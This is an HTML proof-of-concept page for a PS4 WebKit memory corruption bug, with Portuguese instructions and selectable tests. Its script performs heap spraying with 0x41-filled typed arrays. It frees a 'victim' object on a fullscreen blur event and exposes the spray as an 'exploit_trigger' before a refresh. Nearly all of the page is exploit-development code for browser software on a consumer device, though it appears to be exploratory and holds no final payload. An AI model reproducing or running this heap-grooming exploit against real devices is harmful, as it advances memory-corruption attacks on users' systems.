
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit PoC CE-36329-3 – Heap Conditioning Audit</title>
</head>
<body>

<h2>PS4 WebKit Memory Corruption PoC</h2>

<div id="msg">
INSTRUÇÕES:<br>
1. Marque UM teste.<br>
2. Clique RUN TEST.<br>
3. Entre em Fullscreen.<br>
4. Pressione OPTIONS → REFRESH.
</div>

<hr>

<h3>Testes de Heap / Arrays</h3>
<label><input type="checkbox" id="tA"> TESTE A – Arrays sem spray (sem 0x4141)</label><br>
<label><input type="checkbox" id="tB"> TESTE B – Arrays criados ANTES do fullscreen</label><br>
<label><input type="checkbox" id="tC"> TESTE C – Liberar Arrays antes do refresh</label><br>
<label><input type="checkbox" id="tD"> TESTE D – Tipo alternativo (Array / Uint8Array)</label><br>
<label><input type="checkbox" id="tE"> TESTE E – Crescimento gradual (threshold)</label><br>

<hr>

<button onclick="fire()">RUN TEST</button>

<pre id="log"></pre>

<script>
const log = m => document.getElementById("log").textContent += m + "\n";

let spray_storage = [];
let victim = {
    id: "VICTIM_OBJECT",
    data: new Array(100).fill(1.1),
    ptr: { a: 1 }
};

function allocFloatSpray(count, fill) {
    for (let i = 0; i < count; i++) {
        let a = new Float64Array(32);
        if (fill) a.fill(2.121995791e-314); // 0x4141414141414141
        spray_storage.push(a);
    }
}

function allocAltSpray(count) {
    for (let i = 0; i < count; i++) {
        let a = new Uint8Array(256);
        a.fill(0x41);
        spray_storage.push(a);
    }
}

function fire() {
    log("[*] RUN pressed");

    /* TESTE B – heap pré-condicionado */
    if (tB.checked) {
        log("[TEST B] Pre-blur allocation");
        allocFloatSpray(10000, true);
    }

    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();

    window.onblur = function () {
        log("[!] BLUR detected");

        /* TESTE A */
        if (tA.checked) {
            log("[TEST A] Arrays sem spray");
            allocFloatSpray(10000, false);
        }

        /* TESTE D */
        if (tD.checked) {
            log("[TEST D] Tipo alternativo");
            allocAltSpray(8000);
        }

        /* TESTE E */
        if (tE.checked) {
            log("[TEST E] Crescimento gradual");
            for (let step = 0; step < 50; step++) {
                allocFloatSpray(200, true);
            }
        }

        /* PoC ORIGINAL — FREE + SPRAY */
        log("[*] Free victim");
        victim = null;

        if (!tA.checked && !tB.checked && !tD.checked && !tE.checked) {
            log("[*] Original spray");
            allocFloatSpray(10000, true);
        }

        /* TESTE C */
        if (tC.checked) {
            log("[TEST C] Liberando arrays antes do refresh");
            spray_storage = null;
        }

        window.exploit_trigger = spray_storage;
        log("[*] Ready — REFRESH via Options");
    };
}
</script>

</body>
</html>
